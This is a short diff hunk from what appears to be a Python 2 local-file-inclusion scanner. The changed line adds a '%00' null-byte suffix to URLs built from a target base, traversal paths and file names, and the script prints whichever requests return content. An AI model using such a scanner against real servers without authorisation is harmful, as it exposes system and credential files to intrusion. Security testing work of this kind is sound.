@@ -32,7 +32,7 @@ def main():
     print "Valid files:"
     for file in files:
         for path in paths:
-            url = lfiBase + path + file  # + "%00"
+            url = lfiBase + path + file + "%00"
             page = requests.get(url) 
             if page.text:  # and page.status_code == 200:
                 print url
